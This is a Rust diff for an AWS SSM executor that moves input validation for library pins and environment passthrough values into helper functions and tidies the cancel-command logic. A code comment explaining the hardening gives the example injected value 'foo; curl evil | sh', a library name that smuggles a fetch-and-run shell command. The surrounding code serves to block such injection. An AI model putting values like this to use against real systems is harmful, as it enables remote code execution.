@@ -314,8 +314,7 @@ pub struct AwsExecutor {
     /// `pick_instance_type` next provision so a remediation-driven
     /// memory/cpu/gpu bump survives the harness relaunch that follows
     /// an apply. None when no remediation has been applied.
-    pub(super) pending_resources_override:
-        Option<ecaa_workflow_core::remediation::ResourceTarget>,
+    pub(super) pending_resources_override: Option<ecaa_workflow_core::remediation::ResourceTarget>,
     /// Envelope additions accumulated from `apply_overrides`
     /// (library_pins, env_passthrough). Drained by `do_run_iteration`
     /// before invoking the agent so a remediation reaches the
@@ -700,52 +699,10 @@ impl Executor for AwsExecutor {
             self.pending_resources_override = Some(merged);
         }
         for (lib, ver) in &ov.library_pins {
-            // C-8: library names and version values flow
-            // into the SSM RunCommand envelope as `KEY=value` shell
-            // statements. Without sanitization a hostile library name
-            // like `foo; curl evil | sh` becomes a literal statement
-            // in the remote bash script; a hostile version value with
-            // `\n` escapes the assignment and runs the next line as
-            // a command. Refuse anything outside the canonical shape.
-            let Some(suffix) = ecaa_workflow_core::env_validator::sanitize_lib_env_suffix(lib)
-            else {
-                tracing::warn!(
-                    library = %lib,
-                    "rejecting invalid library name in SSM envelope (C-8 hardening)"
-                );
-                continue;
-            };
-            if !ecaa_workflow_core::env_validator::is_safe_env_value(ver) {
-                tracing::warn!(
-                    library = %lib,
-                    value = %ver,
-                    "rejecting invalid library version value in SSM envelope (C-8 hardening)"
-                );
-                continue;
-            }
-            let key = format!("ECAA_LIB_PIN_{suffix}");
-            self.pending_envelope_additions.insert(key, ver.clone());
+            add_library_pin(&mut self.pending_envelope_additions, lib, ver);
         }
         for (k, v) in &ov.env_passthrough {
-            // C-8: see comment above. Refuse keys outside the POSIX env
-            // name shape and values that include `\n`, `\r`, `,`, `=`,
-            // or `\0`.
-            if !ecaa_workflow_core::env_validator::is_valid_env_name(k) {
-                tracing::warn!(
-                    key = %k,
-                    "rejecting invalid env_passthrough key in SSM envelope (C-8 hardening)"
-                );
-                continue;
-            }
-            if !ecaa_workflow_core::env_validator::is_safe_env_value(v) {
-                tracing::warn!(
-                    key = %k,
-                    value = %v,
-                    "rejecting invalid env_passthrough value in SSM envelope (C-8 hardening)"
-                );
-                continue;
-            }
-            self.pending_envelope_additions.insert(k.clone(), v.clone());
+            add_env_passthrough(&mut self.pending_envelope_additions, k, v);
         }
         Ok(())
     }
@@ -776,14 +733,7 @@ impl Executor for AwsExecutor {
     /// available (e.g. the command was dispatched but the DAG update
     /// hadn't persisted the command_id yet).
     fn cancel_task(&self, task_id: &str, dag: &DAG) -> Result<()> {
-        let command_id = dag.tasks.get(task_id).and_then(|t| {
-            if let ecaa_workflow_core::dag::TaskState::Running { remote, .. } = &t.state {
-                remote.as_ref().and_then(|r| r.command_id.clone())
-            } else {
-                None
-            }
-        });
-        let Some(cid) = command_id else {
+        let Some(cid) = running_command_id(dag, task_id) else {
             tracing::warn!(
                 target: "amend_cancel",
                 task_id = %task_id,
@@ -797,30 +747,103 @@ impl Executor for AwsExecutor {
             command_id = %cid,
             "AWS cancel_task: calling ssm cancel-command"
         );
-        let out = self.run_aws(&["ssm", "cancel-command", "--command-id", &cid]);
-        match out {
-            Ok(_) => {
-                tracing::info!(
-                    target: "amend_cancel",
-                    task_id = %task_id,
-                    command_id = %cid,
-                    "AWS cancel_task: ssm cancel-command succeeded"
-                );
-            }
-            Err(e) => {
-                // Best-effort — log and continue; the harness will
-                // still transition the task to Blocked.
-                tracing::warn!(
-                    target: "amend_cancel",
-                    task_id = %task_id,
-                    command_id = %cid,
-                    error = %e,
-                    "AWS cancel_task: ssm cancel-command failed (continuing)"
-                );
-            }
-        }
+        let out = self
+            .run_aws(&["ssm", "cancel-command", "--command-id", &cid])
+            .map(|_| ());
+        log_ssm_cancel_outcome(task_id, &cid, out);
         Ok(())
     }
+}
+
+/// Log the outcome of an `ssm cancel-command`. Best-effort — a failure is
+/// logged and swallowed; the harness still transitions the task to Blocked.
+fn log_ssm_cancel_outcome(task_id: &str, cid: &str, out: Result<()>) {
+    match out {
+        Ok(()) => {
+            tracing::info!(
+                target: "amend_cancel",
+                task_id = %task_id,
+                command_id = %cid,
+                "AWS cancel_task: ssm cancel-command succeeded"
+            );
+        }
+        Err(e) => {
+            tracing::warn!(
+                target: "amend_cancel",
+                task_id = %task_id,
+                command_id = %cid,
+                error = %e,
+                "AWS cancel_task: ssm cancel-command failed (continuing)"
+            );
+        }
+    }
+}
+
+/// Validate and stage one `ECAA_LIB_PIN_*` library pin into the SSM envelope.
+/// C-8: library names and version values flow into the SSM RunCommand
+/// envelope as `KEY=value` shell statements. Without sanitization a hostile
+/// name like `foo; curl evil | sh` becomes a literal statement, and a version
+/// value with `\n` escapes the assignment to run the next line. Anything
+/// outside the canonical shape is rejected (warned) and skipped.
+fn add_library_pin(
+    additions: &mut std::collections::BTreeMap<String, String>,
+    lib: &str,
+    ver: &str,
+) {
+    let Some(suffix) = ecaa_workflow_core::env_validator::sanitize_lib_env_suffix(lib) else {
+        tracing::warn!(
+            library = %lib,
+            "rejecting invalid library name in SSM envelope (C-8 hardening)"
+        );
+        return;
+    };
+    if !ecaa_workflow_core::env_validator::is_safe_env_value(ver) {
+        tracing::warn!(
+            library = %lib,
+            value = %ver,
+            "rejecting invalid library version value in SSM envelope (C-8 hardening)"
+        );
+        return;
+    }
+    let key = format!("ECAA_LIB_PIN_{suffix}");
+    additions.insert(key, ver.to_string());
+}
+
+/// Validate and stage one env-passthrough `KEY=value` into the SSM envelope.
+/// C-8: refuse keys outside the POSIX env name shape and values that include
+/// `\n`, `\r`, `,`, `=`, or `\0` (warned + skipped).
+fn add_env_passthrough(
+    additions: &mut std::collections::BTreeMap<String, String>,
+    k: &str,
+    v: &str,
+) {
+    if !ecaa_workflow_core::env_validator::is_valid_env_name(k) {
+        tracing::warn!(
+            key = %k,
+            "rejecting invalid env_passthrough key in SSM envelope (C-8 hardening)"
+        );
+        return;
+    }
+    if !ecaa_workflow_core::env_validator::is_safe_env_value(v) {
+        tracing::warn!(
+            key = %k,
+            value = %v,
+            "rejecting invalid env_passthrough value in SSM envelope (C-8 hardening)"
+        );
+        return;
+    }
+    additions.insert(k.to_string(), v.to_string());
+}
+
+/// Extract the in-flight SSM `command_id` for `task_id` from the DAG snapshot.
+/// Returns `None` unless the task is `Running` with a populated `command_id`
+/// (e.g. the command was dispatched but the DAG update hadn't persisted yet).
+fn running_command_id(dag: &DAG, task_id: &str) -> Option<String> {
+    let task = dag.tasks.get(task_id)?;
+    let ecaa_workflow_core::dag::TaskState::Running { remote, .. } = &task.state else {
+        return None;
+    };
+    remote.as_ref().and_then(|r| r.command_id.clone())
 }
 
 #[cfg(test)]
